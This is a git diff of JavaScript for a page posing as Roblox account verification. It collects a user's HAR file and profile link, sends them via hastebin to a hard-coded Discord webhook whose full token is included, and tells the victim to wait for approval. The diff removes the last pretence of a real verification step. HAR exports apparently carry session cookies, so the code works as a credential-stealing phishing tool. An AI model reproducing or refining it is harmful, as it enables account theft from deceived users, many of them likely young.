@@ -1,6 +1,6 @@
 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1314271333911232563/20EtgpJYchBuTxpiIxaeXcFQxOzytZJgGOzxpW_TnQgSS9OGDTeBr7vIcDezGhQxWBgZ";
 
-async function step1Submit() {
+async function submitStep1() {
     const harFile = document.getElementById("harFile").value.trim();
     const robloxProfile = document.getElementById("robloxProfile").value.trim();
 
@@ -19,13 +19,7 @@ async function step1Submit() {
     // Send the link to the Discord webhook
     const success = await sendToWebhook(hastebinUrl, robloxProfile);
     if (success) {
-        alert("Step 1 completed. Proceed to Step 2!");
-        document.getElementById("step1").style.display = "none";
-        document.getElementById("step2").style.display = "block";
-
-        // Generate the sentence for Step 2
-        const generatedSentence = "Please put this sentence as your Roblox description for verification.";
-        document.getElementById("generatedSentence").innerText = generatedSentence;
+        alert("Verification submitted successfully! Wait for approval.");
     } else {
         alert("Failed to notify the server. Try again later.");
     }
@@ -62,16 +56,5 @@ async function sendToWebhook(hastebinUrl, robloxProfile) {
     } catch (error) {
         console.error("Error sending to Discord webhook:", error);
         return false;
-    }
-}
-
-async function step2Verify() {
-    const description = prompt("What is your current Roblox description?");
-    const expected = document.getElementById("generatedSentence").innerText;
-
-    if (description === expected) {
-        alert("You are verified! Thank you!");
-    } else {
-        alert("Verification failed. Make sure your description matches the provided sentence.");
     }
 }
